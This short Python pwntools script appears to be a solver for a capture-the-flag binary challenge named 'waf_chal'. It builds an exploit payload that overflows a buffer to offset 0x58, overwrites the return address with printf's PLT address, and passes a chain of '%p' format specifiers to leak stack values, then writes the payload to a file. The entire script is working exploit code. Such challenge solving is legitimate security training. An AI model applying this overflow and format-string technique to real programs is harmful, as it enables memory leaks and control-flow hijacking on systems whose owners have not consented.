from pwn import *
context.arch='amd64'
e=ELF("/work/waf_chal/waf/chal")
PRINTF=e.plt['printf']
# leak payload: 'exit'+fmt, ret slot = printf. total <=0x80.
fmt=b" %p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p"
body=(b"exit"+fmt).ljust(0x58,b"A")
assert b"\x00" not in body
pay=body+p64(PRINTF)
open("/work/waf_payload.bin","wb").write(pay)
print("len",len(pay))
